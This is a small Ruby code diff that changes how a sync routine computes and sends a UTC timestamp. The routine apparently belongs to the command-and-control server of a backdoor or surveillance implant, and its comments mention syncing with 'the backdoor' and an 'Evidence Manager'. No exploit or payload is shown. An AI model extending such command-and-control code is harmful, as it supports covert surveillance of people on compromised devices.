@@ -60,11 +60,11 @@ module Commands
     trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"
 
     # get the time in UTC
-    now = Time.now #- Time.now.utc_offset
-
+    now = Time.now.getutc.to_i
+    
     # notify the database that the sync is in progress
     DB.sync_start session, version, user_id, device_id, source_id, now
-
+    
     # notify the Evidence Manager that the sync is in progress
     EvidenceManager.sync_start session, version, user_id, device_id, source_id, now
 
@@ -72,8 +72,8 @@ module Commands
     command = [PROTO_OK].pack('I')
 
     # the time of the server to synchronize the clocks
-    time = [Time.now.to_i].pack('Q')
-
+    time = [now].pack('Q')
+    
     available = ""
     # ask to the db if there are any availables for the backdoor
     # the results are actually downloaded and saved locally
